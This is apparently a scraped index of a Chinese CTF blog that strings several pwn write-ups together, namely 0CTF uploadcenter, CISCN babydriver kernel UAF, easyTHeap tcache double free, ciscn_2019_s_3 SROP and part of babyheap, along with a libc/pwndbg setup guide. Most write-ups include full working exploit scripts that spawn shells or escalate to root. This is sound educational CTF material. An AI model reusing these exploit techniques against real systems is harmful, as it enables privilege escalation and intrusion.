我们上传了一个9MB大小的图片，但是width和height分别只有1024所以只分配了1MB的空间。我们再查看一下当前线程的栈地址： 当前线程的rsp指向了0x7f4d93437f00如果我们想要利用该程序的漏洞，就需要将这一部分也给释放掉。我们计算一下rsp到图片地址的大小0x7f4d93437f00-0x7f4d92b38000=0x8fff00，如果图片的IDAT的数据为9MB超过了0x8fff00，所以该线程的栈会被我们释放掉。我们删除图片然后来观察一下内存情况： 可以看到我们把线程的栈也给释放掉了。如此我们就可以修改线程栈的信息了（注意：这里之所以线程没有崩溃掉，是因为线程进入了等待消息的状态，也就是进入了休眠）。我们计算一下线程栈地址到mmap顶部的距离，计算得0x1100，同时我们是将png的全部内容复制到mmap的空间里，当我们计算rop链时，需要减掉png头部的信息。如此我们就可以写出exp。 EXP from pwn import * from LibcSearcher import * import zlib from struct import pack if args['REMOTE']: sh=remote() else: sh=process('./uploadcenter') if args['I386']: context.arch='i386' else: context.arch='amd64' if args['DEBUG']: context.log_level='debug' elf=ELF('./uploadcenter') # gdb.attach(sh,''' # c # ''') def choice(election): sh.recvuntil('6 :) Monitor File\\n') sh.sendline(str(election)) def genPngEx(width,height,bit_depth,color_type,i_data,data_length): comprMethod=0 filterMthod=0 interlaceMehod=0 #magic i_magic=pack('\u003eQ',0x89504E470D0A1A0A) #IHDR ihdr='IHDR'+pack('\u003eI',width)+pack('\u003eI',height)+chr(bit_depth)+chr(color_type)+chr(comprMethod)+chr(filterMthod)+\\ chr(interlaceMehod) ihdr=p32(len(ihdr)-4)+ihdr+'AAAA' #IDAT idat=p32(data_length)+'IDAT'+i_data+'AAAA' #IEND iend=p32(0)+'IEND'+'AAAA' return i_magic+ihdr+idat+iend def genPng(width,height,data): data_length=len(data) return genPngEx(width,height,8,2,data,data_length) def add_png(width,height,data): choice(2) png=zlib.compress(genPng(width,height,data)) sh.send(p32(len(png))) sh.send(png) def monitor_file(): choice(6) def delete_file(index): choice(4) sh.recvuntil('?\\n') sh.sendline(str(index)) mutex=0x000000000060E160 cond=0x000000000060E1A0 rdi_ret=0x00000000004038b1 puts_plt=elf.plt['puts'] puts_got=elf.got['puts'] exit=elf.plt['exit'] mutex_unlock=elf.plt['pthread_mutex_unlock'] sleep=elf.plt['sleep'] def rop(ropchain,index): monitor_file() add_png(1024,1024,'A'*1024*1024*9) delete_file(index) payload='A'*(1024*1024-0x1100-0x29) payload+=p64(0)+p64(cond)+p64(mutex)+p64(0)+p64(0) payload+=ropchain payload=payload.ljust(0x100000,'\\x00') add_png(1024,1024,payload) ropchain=p64(rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(rdi_ret)+\\ p64(mutex)+p64(mutex_unlock)+\\ p64(rdi_ret)+p64(60)+p64(sleep) rop(ropchain,0) #leak libc sh.recvuntil('data\\n') puts_addr=u64(sh.recvuntil('\\n').replace('\\n','').ljust(8,'\\x00')) print hex(puts_addr) libc=LibcSearcher('puts',puts_addr) libc_base=puts_addr-libc.dump('puts') system=libc_base+libc.dump('system') bin_sh=libc_base+libc.dump('str_bin_sh') one_gadget=libc_base+0x4526a #get shell ropchain=p64(one_gadget) rop(ropchain,1) sh.interactive() 参考 PNG文件结构 线程互锁 线程信号 线程栈 mmap分配 Dragon sector Tamás Koczka ","date":"2020-05-13","objectID":"/0ctf-uploadcenter/:6:0","tags":["pwn","wp"],"title":"0CTF uploadcenter","uri":"/0ctf-uploadcenter/"},{"categories":["ctf","knowledge"],"content":"以CISCN2017-babydriver这道题来入门kernel pwn。 涉及知识 UAF cred struct tty_struct kernel的gdb调试 利用cred struct来提权 这道题有两种解法，我们先讲第一种。 程序存在一个伪条件竞争的UAF，当我们利用open('/dev/babydrive',2)打开两个设备A和B后，对A设备通过ioctl来申请空间，当A被释放后，B可以操控A申请来的空间，这是因为在驱动程序中，保存空间地址的指针，是一个全局变量，故A和B可以同时访问。 这里我们可以写一个POC来证明这个漏洞的存在。 int f1=open(\"/dev/babydev\",O_RDWR); int f2=open(\"/dev/babydev\",O_RDWR); ioctl(f1,0x10001,0x80); char buf[8]={0x61}; fwrite(f1,buf,8); close(f1); char buf2[8]={0x62}; fwrite(f2,buf2,8); 在fwrite处下断点后，获得申请空间的地址，来查看其值。f1设备对其写入了0x61，当其关闭后，f2又将0x62写入其中，证明f2设备可以操控f1释放后的空间。 那么如果我们这个释放后的空间被另一个进程申请作为其cred_struct的存储空间，我们不就可以修改器cred为0，及root权限了吗？ 那么我们的思路就很清晰了，首先申请一个sizeof(cred_struct)大小的空间，释放掉，然后fork一个新进程，再修改空间为0，提权。 这里有一个需要解决的问题就是cred_struct究竟多大？得到其大小的方法有两一个。 浏览源码，计算其结构的大小 编译一个带符号的内核，直接查看 获得其大小后，就很简单了，直接上EXP。 /* Author: Nopnoping */ #include \u003cstdio.h\u003e#include \u003cunistd.h\u003e#include \u003cstdlib.h\u003e#include \u003cfcntl.h\u003e#include \u003cstring.h\u003e#include \u003csys/types.h\u003e#include \u003csys/wait.h\u003e#include \u003cpthread.h\u003e //use for save environment of user space when to kernel space. size_t user_cs,user_ss,user_sp,user_rflags; void save_status() { //sava cs,ss,sp,rflags __asm__(\"mov user_cs, cs;\" \"mov user_ss, ss;\" \"mov user_sp, rsp;\" \"pushf;\" \"pop user_rflags;\" ); } //commit_creds is a function point to get root //prepare_kernel_cred is also a function point to make a cred struct size_t commit_creds=0,prepare_kernel_cred=0; void get_root() { char*(*pkc)(int)=prepare_kernel_cred; void (*cc)(char *)=commit_creds; //zero is root permissions (*cc)(*pkc(0)); } int main() { int f1=open(\"/dev/babydev\",2); int f2=open(\"/dev/babydev\",2); ioctl(f1,0x10001,0xa8); close(f1); puts(\"[+] close file\"); int pid=fork(); if(pid\u003c0) { puts(\"[+] fork wrong\"); exit(0); } else if(pid==0) { char zeros[30]={0}; write(f2,zeros,28); if(getuid()==0) { puts(\"[+] get root\"); system(\"/bin/sh\"); exit(0); } } else { wait(NULL); } close(f2); return 0; } 利用tty_struct来提权 第二个方法要复杂很多，其利用了tty_stuct。 tty_struct是tty设备创建的一个结构，ptmx设备时tty设备的一种，我们一起来看一下tty_struct结构的内容。 // Linux-4.19.65-source/include/linux/tty.h /* * Where all of the state associated with a tty is kept while the tty * is open. Since the termios state should be kept even if the tty * has been closed --- for things like the baud rate, etc --- it is * not stored here, but rather a pointer to the real state is stored * here. Possible the winsize structure should have the same * treatment, but (1) the default 80x24 is usually right and (2) it's * most often used by a windowing system, which will set the correct * size each time the window is created or resized anyway. * - TYT, 9/14/92 */ struct tty_operations; struct tty_struct { int magic; struct kref kref; struct device *dev; struct tty_driver *driver; const struct tty_operations *ops; int index; /* Protects ldisc changes: Lock tty not pty */ struct ld_semaphore ldisc_sem; struct tty_ldisc *ldisc; struct mutex atomic_write_lock; struct mutex legacy_mutex; struct mutex throttle_mutex; struct rw_semaphore termios_rwsem; struct mutex winsize_mutex; spinlock_t ctrl_lock; spinlock_t flow_lock; /* Termios values are protected by the termios rwsem */ struct ktermios termios, termios_locked; struct termiox *termiox; /* May be NULL for unsupported */ char name[64]; struct pid *pgrp; /* Protected by ctrl lock */ struct pid *session; unsigned long flags; int count; struct winsize winsize; /* winsize_mutex */ unsigned long stopped:1, /* flow_lock */ flow_stopped:1, unused:BITS_PER_LONG - 2; int hw_stopped; unsigned long ctrl_status:8, /* ctrl_lock */ packet:1, unused_ctrl:BITS_PER_LONG - 9; unsigned int receive_room; /* Bytes free for queue */ int flow_change; struct tty_struct *link; struct fasync_struct *fasync; wait_queue_head_t write_wait; wait_queue_head_t read_wait; struct work_struct hangup_work; void *disc_data; void *driver_data; spinlock_t files_lock; /* protects tty_files list */ struct list_head tty_files; #define N_TTY_BUF_SIZE 4096 int closing; unsigned char *write_buf; int write_cnt; /* If the tty has a pending do_SAK, queue it h","date":"2020-05-06","objectID":"/kernel%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF-%E4%BA%8C/:0:0","tags":["kernel","pwn","wp"],"title":"kernel学习之路(二)","uri":"/kernel%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF-%E4%BA%8C/"},{"categories":["ctf"],"content":"利用tache的double free来修改malloc_hook。并利用realloc来使onegadget满足要求 涉及知识 tcache attack realloc_hook和malloc_hook的配合 修改程序ld和libc 程序分析 ","date":"2020-04-18","objectID":"/v-n2020-%E5%85%AC%E5%BC%80%E8%B5%9B-easytheap/:0:0","tags":["pwn","wp"],"title":"[V\u0026N2020 公开赛]easyTHeap","uri":"/v-n2020-%E5%85%AC%E5%BC%80%E8%B5%9B-easytheap/"},{"categories":["ctf"],"content":"保护机制 保护全开，由于靶机环境是ubuntu18，而本机环境是ubuntu16所以需要修改ld和libc，修改方法见这篇文章。修改程序为指定libc版本 \u0026 pwndbg安装 ","date":"2020-04-18","objectID":"/v-n2020-%E5%85%AC%E5%BC%80%E8%B5%9B-easytheap/:1:0","tags":["pwn","wp"],"title":"[V\u0026N2020 公开赛]easyTHeap","uri":"/v-n2020-%E5%85%AC%E5%BC%80%E8%B5%9B-easytheap/"},{"categories":["ctf"],"content":"漏洞分析 程序有四个功能，分别为添加，编辑，显示和删除。程序的漏洞出现在删除部分 当free掉分配的堆块后，没有堆指针清理，存在UAF漏洞。如何利用这一个漏洞获取shell呢？ 由于libc的版本是2.27所以存在tcache bins。tcache bins的保护机制不是十分的严格，使用double free时不会对目标地址进行检测，所以这里我们可以利用tcache的double free来达到任意地址分配。 那我们分配哪个地址呢？程序开启了PIE，我们不能直接写入地址，必须要泄漏地址才可以利用。我们知道unsorted bins被free掉后可以泄漏libc的地址，但是由于存在tcache bins，我们必须将tcache bins存满后，free掉的堆块才会分配到unsorted bins中，可以程序仅能free掉3次，我们该如何利用呢？ 这里我们换个思路，我们分配到堆块的起始位置，因为这里记录了tcache bins的信息。当我们分配了这个堆块后，修改tcache bins的大小为7，就可以实现unsorted bin分配。同时修改tcache bins链表信息，可以达到任意地址分配的作用。 add(0x100) #0 add(0x10) #1 delete(0) delete(0) show(0) heap=u64(sh.recvuntil('\\n').replace('\\n','').ljust(8,'\\x00'))-0x250 我们先分配两个堆块，释放0堆块两次后，就可以泄露出heap的地址 add(0x100) #2 edit(2,p64(heap)) add(0x100) #3 add(0x100) #4 分配一个堆块，并对next进行修改后，再分配两次，我们就可以获得heap起始位置的堆块。 edit(4,'\\x00'*15+'\\x07') delete(0) show(0) libc_base=u64(sh.recvuntil('\\n').replace('\\n','').ljust(8,'\\x00'))-0x3afca0 gadget=[0x4f2c5,0x4f322,0x10a38c] one_gadget=libc_base+0xdeed2 malloc_hook=libc_base+libc.symbols['__malloc_hook'] realloc=libc_base+libc.symbols['realloc'] 我们先将tcache bins的大小修改为7，填满tcache。当我们再次free掉0堆块时，将会被放入unsorted bins中，因此我们就可以泄露出libc的地址并计算出所需gadget的地址。 接下来的思路就很清晰了，分配__malloc_hook附近的堆块，修改__malloc_hook为one_gadget，然后再次分配一个堆块，来获取shell。但是博主刚开始尝试使用这个方法时，不能成功，因为不能满足one_gadget的限制条件，那么该怎么办呢？ 这里利用了一个有趣的技巧，修改__malloc_hook为realloc，将__realloc_hook修改为__one_gadget。这里利用了realloc里面push等调整栈的命令，使调用one_gadget时满足堆栈限制条件。 这里详细讲解一下调试方法，假如我们刚开始修改__malloc_ho0k为realloc,one_gadget的限制条件是rsp+0x70=0 edit(4,'\\x00'*15+'\\x01'+p64(0)*21+p64(malloc_hook-8)) add(0x100) #5 edit(5,p64(one_gadget)+p64(realloc)) 我们利用gdb调试，在onegadget处下断点后。 我们可以发现，在rsp+0x70处，不为零，但是rsp+0x88处为零，我们可以利用realloc加一个偏移量来使得rsp+0x70处值为零。我们先看一下realloc函数的内容。 如果我们不从realloc一开始执行，而是从realloc+6开始执行，将会少执行3个push，我们栈就可以抬高0x18因此我们执行one_gadget时其rsp+0x70处的位置将会是之前的rsp+0x88处，从而满足限制条件。 EXP from pwn import * from LibcSearcher import LibcSearcher from roputils import ROP context.arch='amd64' elf=ELF('./pwn3') #sh=remote('node3.buuoj.cn',28286) sh=process('./pwn2') libc=ELF('/glibc/2.27/amd64/lib/libc-2.27.so') #context.log_level='debug' # gdb.attach(sh,''' # b*0x0000000000400619 # c # ''') def add(size): sh.recvuntil(': ') sh.sendline('1') sh.recvuntil('size?') sh.sendline(str(size)) def edit(index,content): sh.recvuntil(': ') sh.sendline('2') sh.recvuntil('idx?') sh.sendline(str(index)) sh.recvuntil('content:') sh.sendline(content) def show(index): sh.recvuntil(': ') sh.sendline('3') sh.recvuntil('idx?') sh.sendline(str(index)) def delete(index): sh.recvuntil(': ') sh.sendline('4') sh.recvuntil('idx?') sh.sendline(str(index)) add(0x100) #0 add(0x10) #1 delete(0) delete(0) show(0) heap=u64(sh.recvuntil('\\n').replace('\\n','').ljust(8,'\\x00'))-0x250 print hex(heap) add(0x100) #2 edit(2,p64(heap)) add(0x100) #3 add(0x100) #4 edit(4,'\\x00'*15+'\\x07') delete(0) show(0) libc_base=u64(sh.recvuntil('\\n').replace('\\n','').ljust(8,'\\x00'))-0x3afca0 gadget=[0x4f2c5,0x4f322,0x10a38c] one_gadget=libc_base+0xdeed2 malloc_hook=libc_base+libc.symbols['__malloc_hook'] realloc=libc_base+libc.symbols['realloc'] print hex(realloc) edit(4,'\\x00'*15+'\\x01'+p64(0)*21+p64(malloc_hook-8)) add(0x100) #5 edit(5,p64(one_gadget)+p64(realloc+6)) add(0x10) #gdb.attach(sh) sh.interactive() 参考 onegadget不起作用 V\u0026N2020 公开赛]easyTHeap pwn_debug注意事项 ","date":"2020-04-18","objectID":"/v-n2020-%E5%85%AC%E5%BC%80%E8%B5%9B-easytheap/:2:0","tags":["pwn","wp"],"title":"[V\u0026N2020 公开赛]easyTHeap","uri":"/v-n2020-%E5%85%AC%E5%BC%80%E8%B5%9B-easytheap/"},{"categories":["tools"],"content":"如何在ubuntu16上修改程序为libc2.27？如何安装pwndbg以及pwndbg的调试姿势？ 修改程序libc版本 在做pwn题时，经常遇到各种版本的libc，常见的是2.27，2.23。不同版本的libc，其机制又不同，比如2.27版本的libc其引入了tcachebin机制，而2.23是没有这个机制的。因此如果靶机环境是2.27，那么你用2.23做题就无法得到正确payload。这个时候就需要修改程序的libc。 libc和程序是通过动态连接器连接在一起的，其详细信息的信息写在程序的LD_RERLOAD中因此我们可以直接修改LD_PERLOAD为目标libc。 ","date":"2020-04-17","objectID":"/%E4%BF%AE%E6%94%B9%E7%A8%8B%E5%BA%8F%E4%B8%BA%E6%8C%87%E5%AE%9Alibc%E7%89%88%E6%9C%AC-pwndbg%E5%AE%89%E8%A3%85/:0:0","tags":null,"title":"修改程序为指定libc版本 \u0026 pwndbg安装","uri":"/%E4%BF%AE%E6%94%B9%E7%A8%8B%E5%BA%8F%E4%B8%BA%E6%8C%87%E5%AE%9Alibc%E7%89%88%E6%9C%AC-pwndbg%E5%AE%89%E8%A3%85/"},{"categories":["tools"],"content":"直接修改LD_PERLOAD 这种修改方式十分简单粗暴，但也十分容易出错。直接修改时，也需要修改ld.so的版本。低版本的ld.so是无法加载高版本的libc的，所以如果只是简单的修改了libc.so而没有修改ld.so就会引起段错误。 LD_PRELOAD=./libc.so.6 ./pwn 段错误 (核心已转储) 我们需要将ld.so和libc.so一起修改。即在LD_PERLOAD后面添加libc的路径，在第二行添加ld的路径。 LD_PRELOAD=/path/to/libc.so.6; /path/to/ld.so ./pwn 也可以在pwntools启动程序中，进行配置 p=process(['/path/to/ld.so','./pwn'],env={'LD_PERLOAD':'/path/to/libc.so.6'}) 但是这种方式修改后gdb调试时，是没有libc相应调试信息的。 这里我们推荐另外一种方式，下载glbc-all-in-one并编译所需版本的glibc，利用patchelf工具修改程序的链接器和glibc。 ","date":"2020-04-17","objectID":"/%E4%BF%AE%E6%94%B9%E7%A8%8B%E5%BA%8F%E4%B8%BA%E6%8C%87%E5%AE%9Alibc%E7%89%88%E6%9C%AC-pwndbg%E5%AE%89%E8%A3%85/:1:0","tags":null,"title":"修改程序为指定libc版本 \u0026 pwndbg安装","uri":"/%E4%BF%AE%E6%94%B9%E7%A8%8B%E5%BA%8F%E4%B8%BA%E6%8C%87%E5%AE%9Alibc%E7%89%88%E6%9C%AC-pwndbg%E5%AE%89%E8%A3%85/"},{"categories":["tools"],"content":"patchelf修改 ","date":"2020-04-17","objectID":"/%E4%BF%AE%E6%94%B9%E7%A8%8B%E5%BA%8F%E4%B8%BA%E6%8C%87%E5%AE%9Alibc%E7%89%88%E6%9C%AC-pwndbg%E5%AE%89%E8%A3%85/:2:0","tags":null,"title":"修改程序为指定libc版本 \u0026 pwndbg安装","uri":"/%E4%BF%AE%E6%94%B9%E7%A8%8B%E5%BA%8F%E4%B8%BA%E6%8C%87%E5%AE%9Alibc%E7%89%88%E6%9C%AC-pwndbg%E5%AE%89%E8%A3%85/"},{"categories":["tools"],"content":"下载glibc-all-in-one glibc-all-in-one是github上一个开源项目，帮助我们更容易的调试，下载和编译所需libc版本。 git clone https://github.com/matrix1001/glibc-all-in-one.git cd glibc-all-in-one chmod a+x build download extract 在这里简单翻译下glibc-all-in-one github项目上的教程 download 检查支持的包 ➜ glibc-all-in-one cat list 2.23-0ubuntu10_amd64 2.23-0ubuntu10_i386 2.23-0ubuntu11_amd64 2.23-0ubuntu11_i386 2.23-0ubuntu3_amd64 2.23-0ubuntu3_i386 2.27-3ubuntu1_amd64 2.27-3ubuntu1_i386 2.28-0ubuntu1_amd64 2.28-0ubuntu1_i386 2.29-0ubuntu2_amd64 2.29-0ubuntu2_i386 下载 ➜ glibc-all-in-one ./download 2.23-0ubuntu10_i386 Getting 2.23-0ubuntu10_i386 -\u003e Location: https://mirror.tuna.tsinghua.edu.cn/ubuntu/pool/main/g/glibc/libc6_2.23-0ubuntu10_i386.deb -\u003e Downloading libc binary package -\u003e Extracting libc binary package -\u003e Package saved to libs/2.23-0ubuntu10_i386 -\u003e Location: https://mirror.tuna.tsinghua.edu.cn/ubuntu/pool/main/g/glibc/libc6-dbg_2.23-0ubuntu10_i386.deb -\u003e Downloading libc debug package -\u003e Extracting libc debug package -\u003e Package saved to libs/2.23-0ubuntu10_i386/dbg ➜ glibc-all-in-one ls libs/2.23-0ubuntu10_i386 . .. .debug ld-2.23.so libc-2.23.so libpthread.so.0 ...... ➜ glibc-all-in-one ls libs/2.23-0ubuntu10_i386/.debug ld-2.23.so libc-2.23.so ...... 需要的glibc没有在列表中？ 你可以自己下载glibc，然后使用extract。 ‘http://old-releases.ubuntu.com/ubuntu/pool/main/g/glibc/' 可以下载2.19到2.26版本的Ubuntu glibc。 ./extract ~/libc6_2.26-0ubuntu2_i386.deb /tmp/test ./extract ~/libc6-dbg_2.26-0ubuntu2_i386.deb /tmp/test_dbg complile 支持版本:2.19,2.23-2.29 支持架构:i686,amd64 注意：老版本的glibc的编译可能会出问题。 注意：改变GLIBC_DIR可以修改编译后glibc的地址 sudo ./build 2.27 amd64 #数字为你需要的libc版本，amd64为你需要的架构 ","date":"2020-04-17","objectID":"/%E4%BF%AE%E6%94%B9%E7%A8%8B%E5%BA%8F%E4%B8%BA%E6%8C%87%E5%AE%9Alibc%E7%89%88%E6%9C%AC-pwndbg%E5%AE%89%E8%A3%85/:2:1","tags":null,"title":"修改程序为指定libc版本 \u0026 pwndbg安装","uri":"/%E4%BF%AE%E6%94%B9%E7%A8%8B%E5%BA%8F%E4%B8%BA%E6%8C%87%E5%AE%9Alibc%E7%89%88%E6%9C%AC-pwndbg%E5%AE%89%E8%A3%85/"},{"categories":["tools"],"content":"patch下载和使用 当我们获得所需版本的libc和ld后，可以利用patchelf工具来修改程序。 patchelf同样是github上的一个开源项目，它用于修改程序的ld和libc，这里简单讲解一下安装方法和使用方法 安装 git clone https://github.com/NixOS/patchelf.git ./bootstrap.sh ./configure make sudp make install patchelf使用方法 修改程序的动态链接加载器ld patchelf --set-interpreter /lib/my-ld-linux.so.2 my-program 修改程序和库的路径 patchelf --set-rpath /opt/my-libs/lib:/oter-libs my-program 缩减程序和库的路径 patchelf --shrink-rpath my-program 移除一个已声明的依赖动态库(就是移除动态链接库路径) patchelf --remove-needed lib.so myprogram 添加一个已经声明的依赖动态库 patchelf --add-needed libfoo.so.1 my-program 替代一个已声明的以来动态库 patchelf --replace-needed liboriginal.so.1 libreplacement.so.1 my-program 改变动态库的符号名 patchelf --set-soname libnewname.so.3.4.5 path/to/libmylibrary.so.1.2.3 ","date":"2020-04-17","objectID":"/%E4%BF%AE%E6%94%B9%E7%A8%8B%E5%BA%8F%E4%B8%BA%E6%8C%87%E5%AE%9Alibc%E7%89%88%E6%9C%AC-pwndbg%E5%AE%89%E8%A3%85/:2:2","tags":null,"title":"修改程序为指定libc版本 \u0026 pwndbg安装","uri":"/%E4%BF%AE%E6%94%B9%E7%A8%8B%E5%BA%8F%E4%B8%BA%E6%8C%87%E5%AE%9Alibc%E7%89%88%E6%9C%AC-pwndbg%E5%AE%89%E8%A3%85/"},{"categories":["tools"],"content":"修改 现在所需工具我们已经安装好了，我们只需要利用patchelf将ld和libc修改为我们用glibc-all-in-one编译好的ld和libc即可。 patchelf --set-interpreter /glibc/2.27/amd64/lib/lib-2.27.ld ./pwn patchelf --replace-needed libc.so.6 /glibc/2.27/amd64/lib/libc-2.27.so ./pwn 利用ldd测试，即可发现修改成功 ok现在我们可以修改程序为指定libc了，并且all-in-one里面的glibc保留了编译信息，在我们调试时，将会给我们提供很大的帮助，再这里再简单介绍一下pwndbg工具的使用。 pwndbg安装和使用 ","date":"2020-04-17","objectID":"/%E4%BF%AE%E6%94%B9%E7%A8%8B%E5%BA%8F%E4%B8%BA%E6%8C%87%E5%AE%9Alibc%E7%89%88%E6%9C%AC-pwndbg%E5%AE%89%E8%A3%85/:2:3","tags":null,"title":"修改程序为指定libc版本 \u0026 pwndbg安装","uri":"/%E4%BF%AE%E6%94%B9%E7%A8%8B%E5%BA%8F%E4%B8%BA%E6%8C%87%E5%AE%9Alibc%E7%89%88%E6%9C%AC-pwndbg%E5%AE%89%E8%A3%85/"},{"categories":["tools"],"content":"安装 pwndbg是一个gdb插件，给pwn选手调试程序时提供了更多更方便的调试命令，如heap，bins等命令，可以更方便的查看堆的信息。 pwndbg是github项目因此我们可以利用git来下载。 git clone https://github.com/pwndbg/pwndbg.git cd pwndbg ./setup.sh 这里需要注意一下，由于大多数包都是通过pip来安装的，如果不将pip配置为国内镜像源的话，那么非常容易因为网络的原因造成错误，前功尽弃。这里我们配置一下pip的国内镜像。 修改~/.pip/pip.config(如果没有相应文件夹和文件，就新建一个) [global] index-url = https://pypi.tuna.tsinghua.edu.cn/simple [install] trusted-host=mirrors.aliyun.com ","date":"2020-04-17","objectID":"/%E4%BF%AE%E6%94%B9%E7%A8%8B%E5%BA%8F%E4%B8%BA%E6%8C%87%E5%AE%9Alibc%E7%89%88%E6%9C%AC-pwndbg%E5%AE%89%E8%A3%85/:3:0","tags":null,"title":"修改程序为指定libc版本 \u0026 pwndbg安装","uri":"/%E4%BF%AE%E6%94%B9%E7%A8%8B%E5%BA%8F%E4%B8%BA%E6%8C%87%E5%AE%9Alibc%E7%89%88%E6%9C%AC-pwndbg%E5%AE%89%E8%A3%85/"},{"categories":["tools"],"content":"使用方法 这里就不过多介绍pwndbg的使用方法了，详情请浏览pwndbg github上的介绍和参看。 参考 [pwn题加载任意版本libc](https://at0de.com/2020/02/18/pwn%E9%A2%98%E5%8A%A0%E8%BD%BD%E4%BB%BB%E6%84%8F%E7%89%88%E6%9C%AClibc/](https://at0de.com/2020/02/18/pwn题加载任意版本libc/) 关于不同版本glibc强行加载的方法（附上代码) 关于不同版本 glibc 更换的一些问题 glibc-all-in-one pwndbg pwn调试：gdb+pwndbg食用指南 ","date":"2020-04-17","objectID":"/%E4%BF%AE%E6%94%B9%E7%A8%8B%E5%BA%8F%E4%B8%BA%E6%8C%87%E5%AE%9Alibc%E7%89%88%E6%9C%AC-pwndbg%E5%AE%89%E8%A3%85/:4:0","tags":null,"title":"修改程序为指定libc版本 \u0026 pwndbg安装","uri":"/%E4%BF%AE%E6%94%B9%E7%A8%8B%E5%BA%8F%E4%B8%BA%E6%8C%87%E5%AE%9Alibc%E7%89%88%E6%9C%AC-pwndbg%E5%AE%89%E8%A3%85/"},{"categories":["ctf"],"content":"之前学习了SROP但是一直没有实践过，刚好这道题需要使用SROP才能利用，记录一下。 涉及知识 SROP syscall 程序分析 ","date":"2020-04-10","objectID":"/ciscn-2019-s-3/:0:0","tags":["pwn","wp"],"title":"ciscn_2019_s_3","uri":"/ciscn-2019-s-3/"},{"categories":["ctf"],"content":"保护机制 开启NX和部分RELRO ","date":"2020-04-10","objectID":"/ciscn-2019-s-3/:1:0","tags":["pwn","wp"],"title":"ciscn_2019_s_3","uri":"/ciscn-2019-s-3/"},{"categories":["ctf"],"content":"程序分析 在vuln函数处，看起汇编代码可以知道第一个syscall调用的是read函数并读入0x400个字节数据到buf中，而buf距离rsp只有0x10所以这里存在栈溢出。 gadget函数是将rax的值更改为15，而15是signerature的调用好，从这里可以猜测处出题人先考察的是SROP的知识。 ","date":"2020-04-10","objectID":"/ciscn-2019-s-3/:2:0","tags":["pwn","wp"],"title":"ciscn_2019_s_3","uri":"/ciscn-2019-s-3/"},{"categories":["ctf"],"content":"漏洞利用 漏洞利用分为两步第一步是泄漏stack的值，第二步是调用execve('/bin/sh',0,0) ","date":"2020-04-10","objectID":"/ciscn-2019-s-3/:3:0","tags":["pwn","wp"],"title":"ciscn_2019_s_3","uri":"/ciscn-2019-s-3/"},{"categories":["ctf"],"content":"泄漏stack 我们用gdb调试程序后观察到在rsp+0x8处存储了stack地址，而write的大小为0x30刚好可以把rsp+0x8处的地址给leak出来。 ","date":"2020-04-10","objectID":"/ciscn-2019-s-3/:3:1","tags":["pwn","wp"],"title":"ciscn_2019_s_3","uri":"/ciscn-2019-s-3/"},{"categories":["ctf"],"content":"构造Sgineraturn frame 这里就不详细介绍关于SROP的原理，详细的教程请移步参考链接。由于我们泄露了stack地址我们可以把/bin/sh字符串写到stack中，再构造execve系统调用的sgneraturn frame就可以获得shell。 EXP from pwn import * sh=process('./cis') context.arch='amd64' vuln_start=0x00000000004004F1 syscall_ret=0x0000000000400517 hint=0x00000000004004DA #leack stack payload='a'*0x10 payload+=p64(vuln_start) sh.sendline(payload) stack_addr=u64(sh.recv()[32:40])-0x100 #make signal Frame and get shell payload='a'*0x10 payload+=p64(hint) payload+=p64(syscall_ret) sigframe=SigreturnFrame() sigframe.rax=constants.SYS_execve sigframe.rdi=stack_addr+0x110 sigframe.rsi=0 sigframe.rdx=0 sigframe.rsp=stack_addr sigframe.rip=syscall_ret payload+=str(sigframe) payload+=(0x120-len(payload))*'\\x00'+'/bin/sh\\x00' sh.sendline(payload) #gdb.attach(sh) sh.interactive() 反思 想要利用SROP的话需要有足够大的溢出空间和system_ret以及修改rax的gadget，不过rax也可以通过read函数读入的个数来进行修改。总的来说感觉SROP是一个挺好玩的利用方法，利用的时候要注意恢复后rsp寄存器的值。 ","date":"2020-04-10","objectID":"/ciscn-2019-s-3/:3:2","tags":["pwn","wp"],"title":"ciscn_2019_s_3","uri":"/ciscn-2019-s-3/"},{"categories":["ctf"],"content":"参考 SROP原理 ","date":"2020-04-10","objectID":"/ciscn-2019-s-3/:3:3","tags":["pwn","wp"],"title":"ciscn_2019_s_3","uri":"/ciscn-2019-s-3/"},{"categories":["ctf"],"content":"涉及知识 Heap Overflow Unsorted bin attack Fastbin attach(Arbitrary Alloc) 漏洞分析 题目下载 ","date":"2020-04-09","objectID":"/babyheap-0ctf-2017/:0:0","tags":["pwn","wp"],"title":"babyheap_0ctf_2017","uri":"/babyheap-0ctf-2017/"},{"categories":["ctf"],"content":"保护机制 保护机制全开，心里一咯噔，看来这道题需要泄漏Libc地址。 ","date":"2020-04-09","objectID":"/babyheap-0ctf-2017/:1:0","tags":["pwn","wp"],"title":"babyheap_0ctf_2017","uri":"/babyheap-0ctf-2017/"},{"categories":["ctf"],"content":"分析程序 程序的逻辑很简单，漏洞也很明显。在读入数据时，读入的个数是用户自己定义，并且没有进行大小限制，所以这里存在堆溢出，可以堆下一个堆块的内容进行覆盖。 ","date":"2020-04-09","objectID":"/babyheap-0ctf-2017/:2:0","tags":["pwn","wp"],"title":"babyheap_0ctf_2017","uri":"/babyheap-0ctf-2017/"},{"categories":["ctf"],"content":"漏洞利用 由于存在堆溢出，很多堆利用方法都可以使用了，那我们应该使用什么利用方法呢？ 由于保护机制全开，程序的加载基址，每次启动时都会不同。如果我们想getshell的话，第一步就是泄漏Libc的地址。如何泄漏呢？我们可以利用Unsorted bin attack。当free掉的堆块大小大于Fast bin处在small bin范围内时，我们知道其fd将会指向main_arena的地址，而这个地址在libc中偏移是固定的，所以泄漏了fd也就泄露了libc。当我们获得libc后，可以在__malloc_hock_周围找一个堆块，来进行fastbin attack（Arbitrary attack），分配成功后，就可以修改__malloc_hock的值。若将其修改为one_gadget，下一次分配将能getshell 总结一下利用思路 利用Unsorted bin attack泄漏Libc 利用Fast bin attack分配__malloc_hock_附件的堆块 修改__malloc_hock_的值为one_gadget 分配堆块，获得shell 下面将按照利用思路一步步的编写exp ","date":"2020-04-09","objectID":"/babyheap-0ctf-2017/:3:0","tags":["pwn","wp"],"title":"babyheap_0ctf_2017","uri":"/babyheap-0ctf-2017/"},{"categories":["ctf"],"content":"利用Unsorted bin attack泄漏Libc 首先我们分配4个0x10大小的堆块，一个0x80的堆块，再分配一个0x10的堆块用于隔开Top chunck。 alloc(0x10) #0 alloc(0x10) #1 alloc(0x10) #2 alloc(0x10) #3 alloc(0x80) #4 alloc(0x10) #5 我们知道，free掉4后，将会把main_arena的地址写在堆块上，但是我们没有办法把数据读出来。怎么办呢？我们可以利用fast bin 